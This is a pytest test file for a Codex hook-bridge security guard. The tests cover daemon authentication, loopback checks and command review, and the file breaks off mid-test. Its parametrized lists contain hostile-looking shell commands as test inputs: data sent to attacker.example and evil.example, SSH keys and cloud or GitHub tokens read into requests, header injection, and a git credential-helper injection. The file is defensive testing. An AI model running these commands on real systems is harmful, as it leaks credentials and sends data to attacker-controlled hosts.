"""Security and latency tests for the Codex daemon hook bridge."""

from __future__ import annotations

import io
import json
import os
import subprocess
import sys
import threading
import time
from http.server import HTTPServer
from pathlib import Path
from urllib import request
from urllib.parse import urlencode

import pytest

from codex_plugin_scanner.guard.adapters import codex_daemon_hook_auth as hook_auth
from codex_plugin_scanner.guard.adapters import codex_daemon_hook_bridge as bridge
from codex_plugin_scanner.guard.adapters import codex_daemon_hook_bridge_flow as bridge_flow
from codex_plugin_scanner.guard.config import load_guard_config
from codex_plugin_scanner.guard.daemon import manager as daemon_manager
from codex_plugin_scanner.guard.daemon import runtime_hook_deadline as runtime_hook_deadline_module
from codex_plugin_scanner.guard.daemon import server as daemon_server_module
from codex_plugin_scanner.guard.daemon.server import GuardDaemonServer
from codex_plugin_scanner.guard.runtime.local_temp_paths import trusted_temporary_root_for_path
from codex_plugin_scanner.guard.store import GuardStore
from tests.codex_daemon_hook_bridge_fixtures import (
    _bridge_config,
    _DaemonHandler,
    _write_authenticated_daemon_files,
)


def _start_daemon(daemon: GuardDaemonServer, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(daemon_server_module, "_RUNTIME_HOOK_ADMISSION_TIMEOUT_SECONDS", 10.0)
    monkeypatch.setattr(daemon_server_module, "_RUNTIME_HOOK_PROCESS_TIMEOUT_SECONDS", 10.0)
    monkeypatch.setattr(runtime_hook_deadline_module, "_MAX_BUDGET_SECONDS", 12.0)
    monkeypatch.setattr(daemon._server.hook_process_runner, "_timeout_seconds", 8.0)
    try:
        daemon.start()
        deadline = time.monotonic() + 5
        opener = request.build_opener(request.ProxyHandler({}))
        while True:
            try:
                with opener.open(f"http://127.0.0.1:{daemon.port}/healthz", timeout=0.25) as response:
                    if response.status == 200:
                        break
                    if time.monotonic() >= deadline:
                        raise TimeoutError("Guard daemon health check did not return HTTP 200")
                    time.sleep(0.01)
            except OSError:
                if time.monotonic() >= deadline:
                    raise
                time.sleep(0.01)
        if not daemon._server.hook_process_runner.wait_for_capacity(  # pyright: ignore[reportPrivateUsage]
            minimum_workers=1,
            timeout_seconds=15,
        ):
            raise TimeoutError("Guard daemon hook workers did not become ready")
    except BaseException:
        daemon.stop()
        raise


def test_assert_loopback_http_url_rejects_remote_and_credentialed_urls() -> None:
    with pytest.raises(ValueError, match="loopback"):
        hook_auth._assert_loopback_http_url("http://evil.example:5474/v1/hooks/codex")
    with pytest.raises(ValueError, match="credentials"):
        hook_auth._assert_loopback_http_url("http://attacker@127.0.0.1:5474/v1/hooks/codex")
    hook_auth._assert_loopback_http_url("http://[::1]:5474/v1/hooks/codex")


@pytest.mark.parametrize(
    ("host", "expected_url"),
    [
        ("127.0.0.1", "http://127.0.0.1:5474"),
        ("localhost", "http://localhost:5474"),
        ("::1", "http://[::1]:5474"),
    ],
)
def test_daemon_url_accepts_only_authenticated_ipv4_and_ipv6_loopback_state(
    tmp_path: Path,
    host: str,
    expected_url: str,
) -> None:
    guard_home = tmp_path / host.replace(":", "_")
    daemon_manager.write_guard_daemon_state(
        guard_home,
        5474,
        "fixture-token",
        host=host,
    )

    assert hook_auth._daemon_url(guard_home / "daemon-state.json") == expected_url


def test_daemon_url_requires_authenticated_guard_owned_state(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="unavailable"):
        hook_auth._daemon_url(
            tmp_path / "missing-daemon-state.json",
        )

    guard_home = tmp_path / "non-loopback"
    daemon_manager.write_guard_daemon_state(
        guard_home,
        5474,
        "fixture-token",
        host="192.0.2.1",
    )
    with pytest.raises(ValueError, match="identity is incomplete"):
        hook_auth._daemon_url(guard_home / "daemon-state.json")


def test_fail_closed_uses_supported_codex_deny_shapes() -> None:
    pretool = bridge._fail_closed("PreToolUse", "review failed")
    permission = bridge._fail_closed("PermissionRequest", "review failed")
    posttool = bridge._fail_closed("PostToolUse", "review failed")
    prompt = bridge._fail_closed("UserPromptSubmit", "review failed")

    assert pretool["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert permission["hookSpecificOutput"]["decision"]["behavior"] == "deny"
    assert posttool["continue"] is False
    assert prompt["continue"] is False


def test_bridge_keeps_inline_browser_wait_within_consumer_limit(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        bridge,
        "current_process_identity",
        lambda: {"pid": 4102, "startToken": "fixture-start"},
    )
    payload = json.loads(
        bridge._with_browser_wait_process(
            '{"hook_event_name":"PreToolUse"}',
            wait_timeout_seconds=607,
        )
    )

    assert payload[bridge.CODEX_BROWSER_WAIT_TIMEOUT_SECONDS_KEY] == 600
    assert set(payload) == {
        "hook_event_name",
        bridge.CODEX_BROWSER_WAIT_PROCESS_KEY,
        bridge.CODEX_BROWSER_WAIT_TIMEOUT_SECONDS_KEY,
    }


def test_unavailable_prompt_warns_without_stopping_conversation() -> None:
    assert bridge._unavailable_response("UserPromptSubmit", "review failed") == {
        "continue": True,
        "systemMessage": "review failed",
    }
    assert (
        bridge._unavailable_response("PreToolUse", "review failed")["hookSpecificOutput"]["permissionDecision"]
        == "deny"
    )
    allow = bridge._unavailable_response(
        "PreToolUse",
        "review failed",
        json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Read", "tool_input": {"file_path": "src/app.ts"}}),
    )
    assert allow["hookSpecificOutput"]["permissionDecision"] == "allow"


def test_launcher_integrity_failure_does_not_stop_user_prompt(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(json.dumps({"hook_event_name": "UserPromptSubmit", "prompt": "resume"})),
    )
    monkeypatch.setattr(bridge_flow, "_daemon_response", lambda **_kwargs: (_ for _ in ()).throw(OSError()))
    monkeypatch.setattr(
        bridge_flow,
        "trusted_hook_launch",
        lambda **_kwargs: (_ for _ in ()).throw(ValueError("stale manifest")),
    )
    config = _bridge_config(guard_home, 5474)
    config["manifest_path"] = guard_home / "managed" / "codex" / "hooks-fixture.manifest.json"
    config["config_json"] = "{}"

    assert bridge.main(**config) == 0
    assert json.loads(capsys.readouterr().out) == {
        "continue": True,
        "systemMessage": bridge._LAUNCH_INTEGRITY_REASON,
    }


def test_launcher_integrity_failure_still_denies_pretool_use(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Bash"})),
    )
    monkeypatch.setattr(bridge_flow, "_daemon_response", lambda **_kwargs: (_ for _ in ()).throw(OSError()))
    monkeypatch.setattr(
        bridge_flow,
        "trusted_hook_launch",
        lambda **_kwargs: (_ for _ in ()).throw(ValueError("stale manifest")),
    )
    config = _bridge_config(guard_home, 5474)
    config["manifest_path"] = guard_home / "managed" / "codex" / "hooks-fixture.manifest.json"
    config["config_json"] = "{}"

    assert bridge.main(**config) == 0
    response = json.loads(capsys.readouterr().out)
    assert response["hookSpecificOutput"] == {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": bridge._LAUNCH_INTEGRITY_REASON,
    }


def test_codex_post_tool_response_excludes_daemon_metadata() -> None:
    response = bridge._codex_hook_response(
        {
            "policy_action": "allow",
            "reason_code": "output_scan_allow",
            "hookSpecificOutput": {
                "hookEventName": "PostToolUse",
                "additionalContext": "safe context",
                "internal_reason_code": "output_scan_allow",
            },
        },
        event_name="PostToolUse",
    )

    assert response == {
        "hookSpecificOutput": {
            "hookEventName": "PostToolUse",
            "additionalContext": "safe context",
        }
    }
    assert (
        bridge._codex_hook_response(
            {"hookSpecificOutput": "unexpected"},
            event_name="PostToolUse",
        )
        == {}
    )


@pytest.mark.parametrize(
    "challenge_mode",
    [
        pytest.param("wrong-proof", id="stale-port-reused-by-unproven-process"),
        pytest.param("expired", id="stale-expired-challenge"),
        pytest.param("redirect", id="redirect-refused"),
    ],
)
def test_failed_daemon_identity_never_receives_token_or_hook_payload(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    challenge_mode: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    _DaemonHandler.challenge_mode = challenge_mode
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps({"hook_event_name": "PreToolUse"})))

    try:
        exit_code = bridge.main(**_bridge_config(guard_home, daemon.server_address[1]))
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert exit_code == 0
    assert _DaemonHandler.captured_challenge_guard_token is None
    assert _DaemonHandler.captured_guard_token is None
    assert _DaemonHandler.captured_hook_body is None
    assert json.loads(capsys.readouterr().out) == {}


def test_authenticated_generation_rollover_is_rediscovered_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    _DaemonHandler.challenge_mode = "replace-state"
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps({"hook_event_name": "UserPromptSubmit"})))

    try:
        exit_code = bridge.main(**_bridge_config(guard_home, daemon.server_address[1]))
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert exit_code == 0
    assert _DaemonHandler.challenge_count == 2
    assert _DaemonHandler.captured_guard_token == "fixture-token"
    assert json.loads(str(_DaemonHandler.captured_hook_body))["hook_event_name"] == "UserPromptSubmit"
    assert json.loads(capsys.readouterr().out) == {}


def test_authenticated_trust_refresh_preserves_daemon_generation(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    _DaemonHandler.challenge_mode = "refresh-trust-status"
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Bash"})),
    )

    try:
        exit_code = bridge.main(**_bridge_config(guard_home, daemon.server_address[1]))
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    state = json.loads((guard_home / "daemon-state.json").read_text(encoding="utf-8"))
    assert exit_code == 0
    assert _DaemonHandler.challenge_count == 1
    assert _DaemonHandler.captured_guard_token == "fixture-token"
    assert state["trust_status"] == {"status": "refreshed-1"}
    assert json.loads(capsys.readouterr().out) == {}


def test_repeated_generation_rollover_stays_bounded(monkeypatch: pytest.MonkeyPatch) -> None:
    attempts = 0

    def changed_generation(**_kwargs: object) -> dict[str, object]:
        nonlocal attempts
        attempts += 1
        raise bridge_flow._DaemonGenerationChangedError("fixture rollover")

    monkeypatch.setattr(bridge_flow, "_daemon_response_once", changed_generation)

    with pytest.raises(bridge_flow._DaemonGenerationChangedError):
        bridge_flow._daemon_response(
            state_path="unused",
            query="",
            data='{"hook_event_name":"UserPromptSubmit"}',
            timeout_seconds=1,
        )

    assert attempts == 2


def test_tampered_state_is_rejected_before_candidate_contact(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    state_path = guard_home / "daemon-state.json"
    state = json.loads(state_path.read_text(encoding="utf-8"))
    state["state_id"] = "untrusted-replacement"
    state_path.write_text(json.dumps(state), encoding="utf-8")
    os.chmod(state_path, 0o600)
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps({"hook_event_name": "PreToolUse"})))

    try:
        exit_code = bridge.main(**_bridge_config(guard_home, daemon.server_address[1]))
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert exit_code == 0
    assert _DaemonHandler.challenge_count == 0
    assert _DaemonHandler.captured_guard_token is None
    assert _DaemonHandler.captured_hook_body is None
    assert json.loads(capsys.readouterr().out) == {}


@pytest.mark.skipif(os.name == "nt", reason="POSIX mode enforcement")
@pytest.mark.parametrize("private_file", ["daemon-state.json", "daemon-discovery-key", "daemon-auth-token"])
def test_non_private_discovery_files_never_release_token_or_hook_payload(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    private_file: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    os.chmod(guard_home / private_file, 0o644)
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps({"hook_event_name": "PreToolUse"})))

    try:
        exit_code = bridge.main(**_bridge_config(guard_home, daemon.server_address[1]))
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert exit_code == 0
    assert _DaemonHandler.captured_guard_token is None
    assert _DaemonHandler.captured_hook_body is None
    assert json.loads(capsys.readouterr().out) == {}


def test_missing_token_never_falls_back_to_mutable_state(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    (guard_home / "daemon-auth-token").unlink()
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps({"hook_event_name": "PreToolUse"})))

    try:
        exit_code = bridge.main(**_bridge_config(guard_home, daemon.server_address[1]))
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert exit_code == 0
    assert _DaemonHandler.challenge_count == 1
    assert _DaemonHandler.captured_guard_token is None
    assert _DaemonHandler.captured_hook_body is None
    assert json.loads(capsys.readouterr().out) == {}


def test_bridge_authenticates_real_daemon_before_hook_delivery(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode(
        {
            "guard-home": str(guard_home),
            "home": str(tmp_path),
            "workspace": str(workspace),
        }
    )
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"command": "echo hello"},
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    response = json.loads(capsys.readouterr().out)
    assert exit_code == 0
    if "could not authenticate the local daemon" in json.dumps(response).lower():
        assert response["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_bridge_real_daemon_uses_payload_cwd_for_bounded_compound_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "shell",
                    "tool_input": {"command": 'pwd; git status --short --branch; sed -n "1,5p" README.md'},
                    "cwd": str(workspace),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    response = json.loads(capsys.readouterr().out)
    assert response == {} or response["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_bridge_real_daemon_emits_schema_exact_post_tool_response(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PostToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"command": "pwd"},
                    "tool_response": str(workspace),
                    "cwd": str(workspace),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    response = json.loads(capsys.readouterr().out)
    if "hookSpecificOutput" in response:
        assert response == {"hookSpecificOutput": {"hookEventName": "PostToolUse"}}
    else:
        assert response["continue"] is False


def test_bridge_real_daemon_prefers_payload_cwd_for_verified_git_fetch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    configured_workspace = tmp_path / "projects"
    repository = configured_workspace / "example"
    repository.mkdir(parents=True)
    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
    _ = subprocess.run(
        [
            "git",
            "-C",
            str(repository),
            "remote",
            "add",
            "origin",
            "https://github.com/example/project.git",
        ],
        check=True,
    )
    store = GuardStore(guard_home)
    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode(
        {
            "guard-home": str(guard_home),
            "home": str(tmp_path),
            "workspace": str(configured_workspace),
        }
    )
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"command": "git fetch origin main"},
                    "cwd": str(repository),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out) == {}
    assert store.list_approval_requests(limit=None) == []


@pytest.mark.parametrize(
    "command",
    (
        "git fetch origin main",
        "git --no-pager fetch origin main",
        "git -c credential.helper='!echo pwn' fetch origin main",
        "/usr/bin/git fetch origin main",
        "git fetch origin main; true",
        "true && git fetch origin main",
        "GIT_DIR=example/.git git fetch origin main",
        "git --exec-path=/tmp fetch origin main",
        "git -P fetch origin main",
        "git -p fetch origin main",
        "git --no-lazy-fetch fetch origin main",
        "git --no-optional-locks fetch origin main",
        "git --no-advice fetch origin main",
        "git --literal-pathspecs fetch origin main",
    ),
)
def test_bridge_real_daemon_reviews_git_fetch_without_repository_bound_cwd(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    command: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    session_workspace = tmp_path / "projects"
    repository = session_workspace / "example"
    repository.mkdir(parents=True)
    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
    _ = subprocess.run(
        ["git", "-C", str(repository), "remote", "add", "origin", "https://github.com/example/project.git"],
        check=True,
    )
    store = GuardStore(guard_home)
    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode(
        {"guard-home": str(guard_home), "home": str(tmp_path), "workspace": str(session_workspace)}
    )
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"command": command},
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out) != {}


@pytest.mark.parametrize(
    "command",
    (
        "gh api -H 'Accept: application/vnd.github.raw+json' "
        "'repos/hashgraph-online/hol-guard/contents/ci/test-suite-ratchet-baseline.json?ref=release/3.0' "
        "| jq '{tests: .tests, total: .total}'",
        "gh pr view 1 -tREVIEW",
        "gh pr list -q'.[] | select(.state == \"REVIEW_REQUIRED\")'",
        "gh issue list -q'.[] | {REPO: .repository}'",
        "gh pr list -sREVIEW_REQUIRED",
        "gh pr list -aRandy",
        "gh issue list -aRandy",
        "gh pr list -SREVIEW",
        "gh run list -cREVIEW_SHA",
        "gh run list -aRgithub.com/owner/repo --help",
        "gh workflow list -aRowner/repo --help",
        "gh pr view 1 -cROwner/Repo --help",
        "gh issue list -wRgithub.com/OWNER/REPO --help",
        "gh pr list -dROrg/Repo --help",
        "gh run list -aRgithub.com/OWNER/REPO --help",
        "gh pr view 1 -wRRowner/repo --help",
        "gh run list -aRRowner/repo --help",
        "gh -Rowner/repo pr view 17",
        "gh -Rgithub.com/Owner/Repo pr view 17",
    ),
)
def test_bridge_real_daemon_allows_static_github_content_read_with_safe_jq_filter(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    command: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    session_workspace = tmp_path / "projects"
    session_workspace.mkdir()
    store = GuardStore(guard_home)
    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["hook_timeouts"] = {"PreToolUse": 30}
    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"command": command},
                    "cwd": str(session_workspace),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out) == {}
    assert store.list_approval_requests(limit=None) == []


@pytest.mark.parametrize(
    "unsafe_command",
    (
        "gh api user | jq --slurpfile secrets private.json '.'",
        "gh api user | jq 'env | to_entries'",
        "gh api user | jq 'include \"helpers\"; transform'",
        "gh api user | jq '.' > result.json",
        "gh api user; gh pr edit 123 --repo example/project --title changed",
        "gh api --hostname attacker.example repos/o/r",
        "gh api -h attacker.example repos/o/r",
        "GH_HOST=attacker.example gh api repos/o/r",
        "GH_TOKEN=literal-secret gh api repos/o/r",
        "GITHUB_TOKEN=literal-secret gh api repos/o/r",
        "GH_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
        "GITHUB_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
        "GH_CONFIG_DIR=./alternate gh api repos/o/r",
        "env GH_TOKEN=literal-secret gh api repos/o/r",
        "env GH_HOST=attacker.example gh api repos/o/r",
        "export GH_HOST=attacker.example; gh api repos/o/r | jq .",
        "export GH_TOKEN=literal; gh api repos/o/r | jq .",
        "GH_HOST=attacker.example; export GH_HOST; gh api repos/o/r | jq .",
        "export GH_CONFIG_DIR=./alternate-config; gh api repos/o/r | jq .",
        "gh api --hostname github.com --hostname attacker.example repos/o/r",
        "export GH_HOST=github.com; GH_HOST=attacker.example; gh api repos/o/r",
        "GH_HOST=github.com; export GH_HOST; GH_HOST=attacker.example; gh api repos/o/r",
        "export -x GH_TOKEN=literal; gh api repos/o/r",
        "readonly -x GH_CONFIG_DIR=./alternate-config; gh api repos/o/r",
        "declare -x GH_HOST=attacker.example; gh api repos/o/r",
        "GH_HOST=attacker.example bash -lc 'gh api repos/o/r'",
        "bash -lc 'export GH_HOST=attacker.example; gh api repos/o/r'",
        "export GH_HOST=attacker.example; unset gh_host; gh api repos/o/r",
        "export GH_HOST=attacker.example; gh_host=github.com gh api repos/o/r",
        "f(){ export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
        "f(){ export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
        "f(){ export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
        "function f { export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
        "function f { export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
        "function f { export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_HOST=attacker.example'; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_TOKEN=literal'; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_CONFIG_DIR=./alternate-config'; f; gh api repos/o/r | jq .",
        "gh api repos/o/r | jq --arg x \"$(cat .ssh/id_rsa)\" '{x:$x}'",
        "gh api repos/o/r | jq --arg x \"$GH_TOKEN\" '{x:$x}'",
        "gh api repos/o/r | jq --arg x \"$AWS_SECRET_ACCESS_KEY\" '{x:$x}'",
        "gh api -H 'Authorization: Bearer literal-secret' repos/o/r",
        "gh api -H 'X-Callback: https://evil.example/upload' repos/o/r",
        "gh api -H $'Accept: application/vnd.github.raw+json\\r\\nX-Evil: yes' repos/o/r",
        "gh pr view 1 --repo ghe.example/owner/repo",
        "gh pr view 1 -R ghe.example/owner/repo",
        "gh pr view 1 --repo '$OWNER/repo'",
        "gh pr view 1 --repo owner",
        "gh pr view 1 --repo",
        "GH_REPO=ghe.example/owner/repo gh pr view 1",
        "export GH_REPO=ghe.example/owner/repo; gh pr view 1",
        "GH_REPO=ghe.example/owner/repo bash -lc 'gh pr view 1'",
        "bash -lc 'export GH_REPO=ghe.example/owner/repo; gh pr view 1'",
        "gh pr view 1 -wRghe.example/owner/repo --help",
        "gh pr view 1 -cRghe.example/owner/repo --help",
        "gh pr view 1 -wR --help",
        "gh pr view 1 -wR'$OWNER/repo' --help",
        "gh pr list -dRghe.example/owner/repo --help",
        "gh run list -aRghe.example/owner/repo --help",
        "gh workflow list -aRghe.example/owner/repo --help",
        "gh run list -aR --help",
        "gh pr view 1 -cRghe.example/owner/repo --help",
        "gh issue view 1 -cRghe.example/owner/repo --help",
        "gh pr view 1 -cROwner/Repo -R owner/repo --help",
        "gh -Rghe.example/owner/repo pr view 17",
        "gh -R'$OWNER/repo' pr view 17",
        "name=GH_REPO; export $name=ghe.example/o/r; gh pr view 1",
        "name=GH_REPO; declare -x $name=ghe.example/o/r; gh pr view 1",
        "env --split-string='GH_REPO=ghe.example/o/r gh pr view 1'",
        "env -S 'GH_REPO=ghe.example/o/r gh pr view 1'",
        "gh pr view 1 $REPO_ARGS",
        "REPO_ARGS='--repo ghe.example/o/r' bash -lc 'gh pr view 1 $REPO_ARGS'",
        "env REPO_ARGS='-wRghe.example/o/r' bash -lc 'gh pr view 1 $REPO_ARGS'",
        'gh pr view "$(gh pr view 1 --json number --jq .number)"',
        'gh issue view "$(gh pr view 1 --json number --jq .number)"',
        'gh pr view "prefix$(gh pr view 1 --json title --jq .title)"',
        '"gh" pr view "$REPO_ARGS"',
        'command -- "gh" pr view "$REPO_ARGS"',
        "g'h' pr view $REPO_ARGS",
        'g"h" pr view $REPO_ARGS',
        "g\\h pr view $REPO_ARGS",
        '"/usr/local/bin/gh" pr view $REPO_ARGS',
        "gh pr view 'x\\' ; gh pr view ${PR_NUMBER}",
        "env REPO_ARGS='--repo ghe.example/o/r' bash -lc '\"gh\" pr view $REPO_ARGS'",
    ),
)
def test_bridge_real_daemon_keeps_unsafe_github_pipeline_companions_reviewed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    unsafe_command: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    session_workspace = tmp_path / "projects"
    session_workspace.mkdir()
    store = GuardStore(guard_home)
    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"command": unsafe_command},
                    "cwd": str(session_workspace),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out) != {}


def test_bridge_real_daemon_uses_exec_command_workdir_for_verified_git_fetch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
